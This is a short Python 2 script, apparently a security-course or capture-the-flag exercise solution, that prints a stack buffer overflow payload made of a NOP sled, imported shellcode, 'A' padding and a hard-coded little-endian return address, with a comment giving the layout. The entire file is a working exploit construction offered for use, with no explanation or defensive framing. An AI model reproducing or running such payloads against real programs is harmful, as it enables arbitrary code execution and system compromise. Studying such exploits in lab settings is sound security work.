from shellcode import shellcode
from struct import pack

# nop+shellcode+padding+return address (0x40c+address)

print "\x90"*0x230+shellcode+"A"*0x1c5+pack("<I",0xbffecfa0)
